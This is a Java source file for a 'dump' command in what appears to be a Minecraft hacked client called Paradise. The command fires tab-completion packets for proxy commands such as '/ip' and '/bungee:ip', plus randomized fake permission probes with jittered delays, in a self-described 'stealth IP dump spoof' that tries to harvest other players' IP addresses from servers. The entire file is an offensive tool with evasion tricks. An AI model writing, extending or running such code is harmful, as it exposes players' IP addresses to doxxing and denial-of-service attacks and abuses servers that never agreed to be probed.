package net.paradise_client.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DumpCommand extends Command {

    private final Random random = new Random();
    private final ExecutorService executor = Executors.newCachedThreadPool();

    // Common tab-completion targets and fake permission tricks
    private final String[] basePayloads = {
        "/ip ", "/bungee:ip ", "/glist ", "/bungee:glist ", "/serverinfo ", "/bungee:serverinfo "
    };

    private final String[] fakePermissions = {
        "luckperms.user.info", "luckperms.user.permission.info", "essentials.getip", "essentials.info", 
        "bungee.ip", "bungee.see", "adminpanel.access", "tabcomplete.bypass", "chatcontrol.bypass", 
        "luckperms.verbose", "permissions.debug", "network.spy", "bungeecord.command.server"
    };

    public DumpCommand() {
        super("dump", "Attempts to dump IPs using tab spoofing and fake permission probes");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            Helper.printChatMessage("§7[§bParadise§7] §aLaunching stealth IP dump spoof...");

            for (String base : basePayloads) {
                executor.submit(() -> {
                    try {
                        // Send the base command
                        int id = random.nextInt(Integer.MAX_VALUE);
                        Helper.sendPacket(new RequestCommandCompletionsC2SPacket(id, base));
                        Thread.sleep(100 + random.nextInt(150));

                        // Follow with spoofed permissions and decoys
                        for (int i = 0; i < 5; i++) {
                            String fake = "/" + fakePermissions[random.nextInt(fakePermissions.length)] + " ";
                            int spoofId = random.nextInt(Integer.MAX_VALUE);
                            Helper.sendPacket(new RequestCommandCompletionsC2SPacket(spoofId, fake));
                            Thread.sleep(50 + random.nextInt(100));
                        }

                    } catch (Exception e) {
                        Helper.printChatMessage("§c[Dump] Spoof failed for: " + base);
                    }
                });
            }

            return SINGLE_SUCCESS;
        });
    }
}
